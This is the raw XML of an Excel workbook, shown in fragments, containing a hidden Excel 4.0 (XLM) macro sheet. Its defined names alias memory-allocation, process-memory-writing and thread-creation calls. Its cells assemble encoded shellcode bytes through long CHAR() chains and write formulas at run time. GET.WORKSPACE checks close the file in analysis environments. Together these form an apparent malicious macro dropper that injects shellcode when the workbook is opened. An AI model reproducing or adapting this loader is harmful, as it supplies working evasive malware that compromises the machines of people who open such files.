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estUser\Desktop\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{3F0D8A5A-1FF6-473B-974B-1E2995FB14EB}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-98" yWindow="-98" windowWidth="27076" windowHeight="14941" xr2:uid="{2F3292BB-F168-495E-BCC0-A3A17F1A5836}"/>
  </bookViews>
  <sheets>
    <sheet name="Macro1" sheetId="2" r:id="rId1"/>
    <sheet name="Sheet1" sheetId="1" r:id="rId2"/>
  </sheets>
  <definedNames>
    <definedName name="CThread" function="1" xlm="1" functionGroupId="9">-1680080894</definedName>
    <definedName name="Go" function="1" xlm="1" functionGroupId="9">-690421755</definedName>
    <definedName name="main" localSheetId="0">Macro1!$DG$601</definedName>
    <definedName name="Queue" function="1" xlm="1" functionGroupId="9">-1103233020</definedName>
    <definedName name="RTL" function="1" xlm="1" functionGroupId="9">858783747</definedName>
    <definedName name="Valloc" function="1" xlm="1" functionGroupId="9">-647561216</definedName>
    <definedName name="WProcessMemory" function="1" xlm="1" functionGroupId="9">-151322623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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="68" uniqueCount="67">
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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</si>
  <si>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]</t>
  </si>
  <si>
    <t>=</t>
  </si>
  <si>
    <t>(</t>
  </si>
  <si>
    <t>)</t>
  </si>
  <si>
    <t>"</t>
  </si>
  <si>
    <t>&lt;</t>
  </si>
  <si>
    <t>&gt;</t>
  </si>
  <si>
    <t>.</t>
  </si>
  <si>
    <t>+</t>
  </si>
  <si>
    <t>*</t>
  </si>
  <si>
    <t>:</t>
  </si>
  <si>
    <t>-</t>
  </si>
  <si>
    <t>,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</si>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</sst>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89C45A2-B3CA-4F83-ADAC-7EFFD08600D8}">
  <dimension ref="DE1:DJ601"/>
  <sheetViews>
    <sheetView showFormulas="1" tabSelected="1" topLeftCell="CV1" workbookViewId="0">
      <selection activeCell="DE18" sqref="DE18"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.25" x14ac:dyDescent="0.45"/>
  <sheetData>
    <row r="1" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE1" t="b">
        <f>FORMULA(DH65&amp;DH35&amp;DH32&amp;DH66&amp;DH33&amp;DH31&amp;DH46&amp;DH71&amp;DH49&amp;DH41&amp;DH44&amp;DH37&amp;DH45&amp;DH42&amp;DH27&amp;DH29&amp;DH31&amp;DH66&amp;DH54&amp;DH62&amp;DH67&amp;DH76&amp;DH76&amp;DH29&amp;DH38&amp;DH41&amp;DH45&amp;DH31&amp;DH66&amp;DH46&amp;DH44&amp;DH47&amp;DH31&amp;DH67&amp;DH67,DJ1)</f>
        <v>1</v>
      </c>
      <c r="DF1" t="str">
        <f>CHAR(235)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(137)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(161)&amp;CHAR(252)&amp;CHAR(174)&amp;CHAR(117)&amp;CHAR(253)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(137)&amp;CHAR(222)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(48)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(63)&amp;CHAR(60)&amp;CHAR(66)&amp;CHAR(116)&amp;CHAR(8)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(62)&amp;CHAR(161)&amp;CHAR(117)&amp;CHAR(238)&amp;CHAR(235)&amp;CHAR(234)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(232)&amp;CHAR(216)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(161)&amp;CHAR(237)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(21)&amp;CHAR(82)&amp;CHAR(102)&amp;CHAR(214)&amp;CHAR(46)&amp;CHAR(186)&amp;CHAR(186)&amp;CHAR(232)&amp;CHAR(201)&amp;CHAR(172)&amp;CHAR(122)&amp;CHAR(224)&amp;CHAR(180)&amp;CHAR(241)&amp;CHAR(176)&amp;CHAR(166)&amp;CHAR(204)&amp;CHAR(7)&amp;CHAR(153)&amp;CHAR(4)&amp;CHAR(56)&amp;CHAR(104)&amp;CHAR(211)&amp;CHAR(188)&amp;CHAR(83)&amp;CHAR(25)&amp;CHAR(47)&amp;CHAR(183)&amp;CHAR(192)&amp;CHAR(146)&amp;CHAR(52)&amp;CHAR(89)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(64)&amp;CHAR(220)&amp;CHAR(29)&amp;CHAR(104)&amp;CHAR(202)&amp;CHAR(203)&amp;CHAR(99)&amp;CHAR(104)&amp;CHAR(60)&amp;CHAR(254)&amp;CHAR(129)&amp;CHAR(179)&amp;CHAR(207)&amp;CHAR(172)&amp;CHAR(157)&amp;CHAR(34)&amp;CHAR(2)&amp;CHAR(36)&amp;CHAR(198)&amp;CHAR(141)&amp;CHAR(181)&amp;CHAR(188)&amp;CHAR(124)&amp;CHAR(231)&amp;CHAR(103)&amp;CHAR(79)&amp;CHAR(4)&amp;CHAR(54)&amp;CHAR(234)&amp;CHAR(222)&amp;CHAR(49)&amp;CHAR(173)&amp;CHAR(227)&amp;CHAR(141)&amp;CHAR(221)&amp;CHAR(214)&amp;CHAR(20)&amp;CHAR(162)&amp;CHAR(39)&amp;CHAR(35)&amp;CHAR(219)&amp;CHAR(179)&amp;CHAR(187)&amp;CHAR(191)&amp;CHAR(107)&amp;CHAR(239)&amp;CHAR(144)&amp;CHAR(248)&amp;CHAR(15)&amp;CHAR(76)&amp;CHAR(76)&amp;CHAR(181)&amp;CHAR(158)&amp;CHAR(73)&amp;CHAR(181)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(165)&amp;CHAR(225)&amp;CHAR(240)&amp;CHAR(136)&amp;CHAR(147)&amp;CHAR(46)&amp;CHAR(150)&amp;CHAR(123)&amp;CHAR(190)&amp;CHAR(245)&amp;CHAR(92)&amp;CHAR(52)&amp;CHAR(19)&amp;CHAR(178)&amp;CHAR(238)&amp;CHAR(191)&amp;CHAR(169)&amp;CHAR(151)&amp;CHAR(47)&amp;CHAR(106)&amp;CHAR(186)&amp;CHAR(110)&amp;CHAR(135)&amp;CHAR(240)&amp;CHAR(24)&amp;CHAR(38)&amp;CHAR(231)&amp;CHAR(26)&amp;CHAR(162)&amp;CHAR(154)&amp;CHAR(229)&amp;CHAR(192)&amp;CHAR(74)&amp;CHAR(235)&amp;CHAR(149)&amp;CHAR(80)&amp;CHAR(18)&amp;CHAR(138)&amp;CHAR(155)&amp;CHAR(80)&amp;CHAR(252)&amp;CHAR(38)&amp;CHAR(3)&amp;CHAR(153)&amp;CHAR(217)</f>
        <v>ë#[‰ß°¡ü®uý‰ù‰ÞŠ_x0006_0_x0007_Gf?&lt;Bt_x0008_F€&gt;¡uîëêÿáèØÿÿÿ_x0005_	_x0001__x0002__x0005__x0006_	_x0007__x0005__x0011__x0007__x0001__x0002__x000B__x0005__x0002__x0005__x0007__x0013__x0007_
_x0005__x0005__x0007_	_x0005__x0006__x0007__x0013__x0005__x0002__x0004__x0002_
_x000D__x0006__x0007__x0003__x000B_	_x0002__x0016__x000C__x0004__x0002__x0006__x000F__x000C__x000C__x000D__x000B_
_x000E__x0004__x0006_!_x0002__x0001__x0013_
_x0007_
_x0005__x000B_¡íF_x0002__x0005_ŽN_x0007__x0005__x0015_RfÖ.ººèÉ¬zà´ñ°¦Ì_x0007_™_x0004_8hÓ¼S_x0019_/·À’4Y_x0016__x000C__x0004__x0002_Œ@Ü_x001D_hÊËch&lt;þ³Ï¬"_x0002_$Æµ¼|çgO_x0004_6êÞ1­ãÝÖ_x0014_¢'#Û³»¿kïø_x000F_LLµžIµöý¥áðˆ“.–{¾õ\4_x0013_²î¿©—/jºn‡ð_x0018_&amp;ç_x001A_¢šåÀJë•P_x0012_Š›Pü&amp;_x0003_™Ù</v>
      </c>
      <c r="DG1" t="str">
        <f>CHAR(72)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(129)&amp;CHAR(233)&amp;CHAR(24)&amp;CHAR(253)&amp;CHAR(255)&amp;CHAR(255)</f>
        <v>H1ÉHé_x0018_ýÿÿ</v>
      </c>
      <c r="DH1" t="s">
        <v>0</v>
      </c>
      <c r="DI1">
        <v>600</v>
      </c>
      <c r="DJ1">
        <f>IF(GET.WORKSPACE(19),,CLOSE(TRUE))</f>
        <v>0</v>
      </c>
    </row>
    <row r="2" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE2" t="b">
        <f>FORMULA(DH65&amp;DH35&amp;DH32&amp;DH66&amp;DH33&amp;DH31&amp;DH46&amp;DH71&amp;DH49&amp;DH41&amp;DH44&amp;DH37&amp;DH45&amp;DH42&amp;DH27&amp;DH29&amp;DH31&amp;DH66&amp;DH57&amp;DH55&amp;DH67&amp;DH76&amp;DH76&amp;DH29&amp;DH38&amp;DH41&amp;DH45&amp;DH31&amp;DH66&amp;DH46&amp;DH44&amp;DH47&amp;DH31&amp;DH67&amp;DH67,DJ2)</f>
        <v>1</v>
      </c>
      <c r="DF2" t="str">
        <f>CHAR(251)&amp;CHAR(52)&amp;CHAR(98)&amp;CHAR(160)&amp;CHAR(95)&amp;CHAR(186)&amp;CHAR(34)&amp;CHAR(190)&amp;CHAR(194)&amp;CHAR(14)&amp;CHAR(123)&amp;CHAR(253)&amp;CHAR(235)&amp;CHAR(224)&amp;CHAR(185)&amp;CHAR(193)&amp;CHAR(183)&amp;CHAR(91)&amp;CHAR(154)&amp;CHAR(96)&amp;CHAR(171)&amp;CHAR(1)&amp;CHAR(133)&amp;CHAR(60)&amp;CHAR(34)&amp;CHAR(111)&amp;CHAR(109)&amp;CHAR(159)&amp;CHAR(254)&amp;CHAR(1)&amp;CHAR(223)&amp;CHAR(142)&amp;CHAR(114)&amp;CHAR(111)&amp;CHAR(241)&amp;CHAR(247)&amp;CHAR(162)&amp;CHAR(69)&amp;CHAR(243)&amp;CHAR(124)&amp;CHAR(210)&amp;CHAR(96)&amp;CHAR(238)&amp;CHAR(26)&amp;CHAR(179)&amp;CHAR(143)&amp;CHAR(18)&amp;CHAR(203)&amp;CHAR(122)&amp;CHAR(240)&amp;CHAR(219)&amp;CHAR(136)&amp;CHAR(21)&amp;CHAR(25)&amp;CHAR(32)&amp;CHAR(125)&amp;CHAR(158)&amp;CHAR(16)&amp;CHAR(102)&amp;CHAR(238)&amp;CHAR(107)&amp;CHAR(78)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(234)&amp;CHAR(65)&amp;CHAR(152)&amp;CHAR(63)&amp;CHAR(69)&amp;CHAR(33)&amp;CHAR(63)&amp;CHAR(200)&amp;CHAR(145)&amp;CHAR(82)&amp;CHAR(235)&amp;CHAR(146)&amp;CHAR(233)&amp;CHAR(28)&amp;CHAR(167)&amp;CHAR(222)&amp;CHAR(179)&amp;CHAR(218)&amp;CHAR(122)&amp;CHAR(45)&amp;CHAR(80)&amp;CHAR(191)&amp;CHAR(229)&amp;CHAR(235)&amp;CHAR(17)&amp;CHAR(237)&amp;CHAR(7)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(106)&amp;CHAR(223)&amp;CHAR(14)&amp;CHAR(137)&amp;CHAR(54)&amp;CHAR(16)&amp;CHAR(108)&amp;CHAR(6)&amp;CHAR(184)&amp;CHAR(86)&amp;CHAR(43)&amp;CHAR(246)&amp;CHAR(5)&amp;CHAR(201)&amp;CHAR(153)&amp;CHAR(4)&amp;CHAR(36)&amp;CHAR(231)&amp;CHAR(55)&amp;CHAR(235)&amp;CHAR(91)&amp;CHAR(192)&amp;CHAR(20)&amp;CHAR(58)&amp;CHAR(106)&amp;CHAR(139)&amp;CHAR(68)&amp;CHAR(209)&amp;CHAR(45)&amp;CHAR(3)&amp;CHAR(127)&amp;CHAR(233)&amp;CHAR(92)&amp;CHAR(183)&amp;CHAR(13)&amp;CHAR(231)&amp;CHAR(224)&amp;CHAR(116)&amp;CHAR(87)&amp;CHAR(69)&amp;CHAR(247)&amp;CHAR(166)&amp;CHAR(121)&amp;CHAR(51)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(139)&amp;CHAR(165)&amp;CHAR(82)&amp;CHAR(210)&amp;CHAR(29)&amp;CHAR(128)&amp;CHAR(40)&amp;CHAR(202)&amp;CHAR(214)&amp;CHAR(231)&amp;CHAR(189)&amp;CHAR(212)&amp;CHAR(46)&amp;CHAR(49)&amp;CHAR(208)&amp;CHAR(169)&amp;CHAR(245)&amp;CHAR(73)&amp;CHAR(125)&amp;CHAR(158)&amp;CHAR(65)&amp;CHAR(6)&amp;CHAR(217)&amp;CHAR(207)&amp;CHAR(178)&amp;CHAR(202)&amp;CHAR(69)&amp;CHAR(212)&amp;CHAR(34)&amp;CHAR(205)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(19)</f>
        <v>û4b _º"¾Â_x000E_{ýëà¹Á·[š`«_x0001_…&lt;"omŸþ_x0001_ßŽroñ÷¢Eó|Ò`î_x001A_³_x0012_ËzðÛˆ_x0015__x0019_ }ž_x0010_fîkN‘QêA˜?E!?È‘Rë’é_x001C_§Þ³Úz-P¿åë_x0011_í_x0007__x0011_Ùjß_x000E_‰6_x0010_l_x0006_¸V+ö_x0005_É™_x0004_$ç7ë[À_x0014_:j‹DÑ-_x0003_é\·_x000D_çàtWE÷¦y3_x0012_Œ‹¥RÒ_x001D_€(ÊÖç½Ô.1Ð©õI}žA_x0006_ÙÏ²ÊEÔ"Í
_x0005__x000B__x0005_	_x0001__x0002__x0005__x0006_	_x0007__x0005__x0011__x0007__x0001__x0002__x000B__x0005__x0002__x0005__x0007__x0013__x0007_
_x0005__x0005__x0007_	_x0005__x0006__x0007__x0013__x0005__x0002__x0004__x0002_
_x000D__x0006__x0007__x0003__x000B_	_x0002__x0016__x000C__x0004__x0002__x0006__x000F__x000C__x000C__x000D__x000B_
_x000E__x0004__x0006_!_x0002__x0001__x0013_
_x0007_
_x0005__x000B__x0005_	_x0001__x0002__x0005__x0006_	_x0007__x0005__x0011__x0007__x0001__x0002__x000B__x0005__x0002__x0005__x0007__x0013_</v>
      </c>
      <c r="DG2" t="str">
        <f>CHAR(72)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(72)&amp;CHAR(187)&amp;CHAR(215)</f>
        <v>H_x0005_ïÿÿÿH»×</v>
      </c>
      <c r="DH2" t="s">
        <v>1</v>
      </c>
      <c r="DI2">
        <v>1</v>
      </c>
      <c r="DJ2">
        <f>IF(GET.WORKSPACE(42),,CLOSE(TRUE))</f>
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE3" t="b">
        <f>FORMULA(DH65&amp;DH35&amp;DH32&amp;DH66&amp;DH33&amp;DH31&amp;DH46&amp;DH71&amp;DH49&amp;DH41&amp;DH44&amp;DH37&amp;DH45&amp;DH42&amp;DH27&amp;DH29&amp;DH31&amp;DH66&amp;DH54&amp;DH56&amp;DH67&amp;DH69&amp;DH60&amp;DH60&amp;DH53&amp;DH76&amp;DH29&amp;DH38&amp;DH41&amp;DH45&amp;DH31&amp;DH66&amp;DH46&amp;DH44&amp;DH47&amp;DH31&amp;DH67&amp;DH76&amp;DH67,DJ3)</f>
        <v>1</v>
      </c>
      <c r="DF3" t="str">
        <f>CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(33)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(63)&amp;CHAR(244)&amp;CHAR(61)&amp;CHAR(100)&amp;CHAR(7)&amp;CHAR(70)&amp;CHAR(111)&amp;CHAR(141)&amp;CHAR(214)&amp;CHAR(239)&amp;CHAR(156)&amp;CHAR(102)&amp;CHAR(67)&amp;CHAR(44)&amp;CHAR(93)&amp;CHAR(224)&amp;CHAR(115)&amp;CHAR(244)&amp;CHAR(219)&amp;CHAR(154)&amp;CHAR(203)&amp;CHAR(27)&amp;CHAR(213)&amp;CHAR(123)&amp;CHAR(247)&amp;CHAR(133)&amp;CHAR(8)&amp;CHAR(142)&amp;CHAR(88)&amp;CHAR(40)&amp;CHAR(191)&amp;CHAR(78)&amp;CHAR(166)&amp;CHAR(203)&amp;CHAR(230)&amp;CHAR(122)&amp;CHAR(217)&amp;CHAR(37)&amp;CHAR(111)&amp;CHAR(216)&amp;CHAR(52)&amp;CHAR(26)&amp;CHAR(214)&amp;CHAR(60)&amp;CHAR(195)&amp;CHAR(15)&amp;CHAR(242)&amp;CHAR(193)&amp;CHAR(198)&amp;CHAR(252)&amp;CHAR(7)&amp;CHAR(132)&amp;CHAR(4)&amp;CHAR(188)&amp;CHAR(225)&amp;CHAR(80)&amp;CHAR(137)&amp;CHAR(135)&amp;CHAR(67)&amp;CHAR(10)&amp;CHAR(70)&amp;CHAR(171)&amp;CHAR(250)&amp;CHAR(252)&amp;CHAR(29)&amp;CHAR(85)&amp;CHAR(46)&amp;CHAR(2)&amp;CHAR(209)&amp;CHAR(92)&amp;CHAR(1)&amp;CHAR(219)&amp;CHAR(199)&amp;CHAR(201)&amp;CHAR(205)&amp;CHAR(114)&amp;CHAR(77)&amp;CHAR(192)&amp;CHAR(158)&amp;CHAR(172)&amp;CHAR(37)&amp;CHAR(245)&amp;CHAR(128)&amp;CHAR(68)&amp;CHAR(92)&amp;CHAR(21)&amp;CHAR(111)&amp;CHAR(176)&amp;CHAR(212)&amp;CHAR(155)&amp;CHAR(204)&amp;CHAR(189)&amp;CHAR(167)</f>
        <v>_x0007_
_x0005__x0005__x0007_	_x0005__x0006__x0007__x0013__x0005__x0002__x0004__x0002_
_x000D__x0006__x0007__x0003__x000B_	_x0002__x0016__x000C__x0004__x0002__x0006__x000F__x000C__x000C__x000D__x000B_
_x000E__x0004__x0006_!_x0002__x0001__x0013_
_x0007_
_x0005__x000B__x0005_	_x0001__x0002__x0005__x0006_	_x0007__x0005__x0011__x0007__x0001__x0002__x000B__x0005__x0002__x0005__x0007__x0013__x0007_
_x0005__x0005__x0007_	_x0005__x0006__x0007__x0013__x0005__x0002__x0004__x0002_
_x000D__x0006__x0007__x0003__x000B_	_x0002__x0016__x000C__x0004__x0002__x0006__x000F__x000C__x000C__x000D__x000B_
_x000E__x0004__x0006_!_x0002__x0001__x0013_
_x0007_
_x0005__x000B__x0005_	_x0001__x0002__x0005__x0006_	_x0007__x0005__x0011__x0007__x0001__x0002__x000B__x0005__x0002__x0005__x0007__x0013__x0007_
_x0005__x0005__x0007_	_x0005__x0006__x0007__x0013__x0005__x0002__x0004__x0002_
_x000D__x0006__x0007__x0003__x000B_	_x0002__x0016__x000C__x0004__x0002__x0006__x000F__x000C__x000C__x000D__x000B_
_x000E_?ô=d_x0007_FoÖïœfC,]àsôÛšË_x001B_Õ{÷…_x0008_ŽX(¿N¦ËæzÙ%oØ4_x001A_Ö&lt;Ã_x000F_òÁÆü_x0007_„_x0004_¼áP‰‡C
F«úü_x001D_U._x0002_Ñ\_x0001_ÛÇÉÍrMÀž¬%õ€D\_x0015_o°Ô›Ì½§</v>
      </c>
      <c r="DG3" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(72)&amp;CHAR(49)&amp;CHAR(88)</f>
        <v>Õ†Ê|Ÿ_x001D_RH1X</v>
      </c>
      <c r="DH3" t="s">
        <v>2</v>
      </c>
      <c r="DJ3">
        <f>IF(GET.WORKSPACE(13)&lt;770,CLOSE(TRUE),)</f>
        <v>0</v>
      </c>
    </row>
    <row r="4" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE4" t="b">
        <f>FORMULA(DH65&amp;DH35&amp;DH32&amp;DH66&amp;DH33&amp;DH31&amp;DH46&amp;DH71&amp;DH49&amp;DH41&amp;DH44&amp;DH37&amp;DH45&amp;DH42&amp;DH27&amp;DH29&amp;DH31&amp;DH66&amp;DH54&amp;DH57&amp;DH67&amp;DH69&amp;DH56&amp;DH61&amp;DH54&amp;DH76&amp;DH29&amp;DH38&amp;DH41&amp;DH45&amp;DH31&amp;DH66&amp;DH46&amp;DH44&amp;DH47&amp;DH31&amp;DH67&amp;DH76&amp;DH67,DJ4)</f>
        <v>1</v>
      </c>
      <c r="DF4" t="str">
        <f>CHAR(108)&amp;CHAR(235)&amp;CHAR(236)&amp;CHAR(207)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(245)&amp;CHAR(110)&amp;CHAR(173)&amp;CHAR(149)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(37)&amp;CHAR(237)&amp;CHAR(246)&amp;CHAR(79)&amp;CHAR(116)&amp;CHAR(56)&amp;CHAR(116)&amp;CHAR(142)&amp;CHAR(133)&amp;CHAR(133)&amp;CHAR(25)&amp;CHAR(172)&amp;CHAR(176)&amp;CHAR(38)&amp;CHAR(215)&amp;CHAR(54)&amp;CHAR(244)&amp;CHAR(195)&amp;CHAR(105)&amp;CHAR(138)&amp;CHAR(87)&amp;CHAR(93)&amp;CHAR(55)&amp;CHAR(168)&amp;CHAR(254)&amp;CHAR(166)&amp;CHAR(71)&amp;CHAR(53)&amp;CHAR(170)&amp;CHAR(203)&amp;CHAR(192)&amp;CHAR(36)&amp;CHAR(147)&amp;CHAR(54)&amp;CHAR(40)&amp;CHAR(177)&amp;CHAR(110)&amp;CHAR(225)&amp;CHAR(153)&amp;CHAR(3)&amp;CHAR(192)&amp;CHAR(173)&amp;CHAR(46)&amp;CHAR(26)&amp;CHAR(50)&amp;CHAR(254)&amp;CHAR(128)&amp;CHAR(155)&amp;CHAR(54)&amp;CHAR(233)&amp;CHAR(144)&amp;CHAR(201)&amp;CHAR(117)&amp;CHAR(69)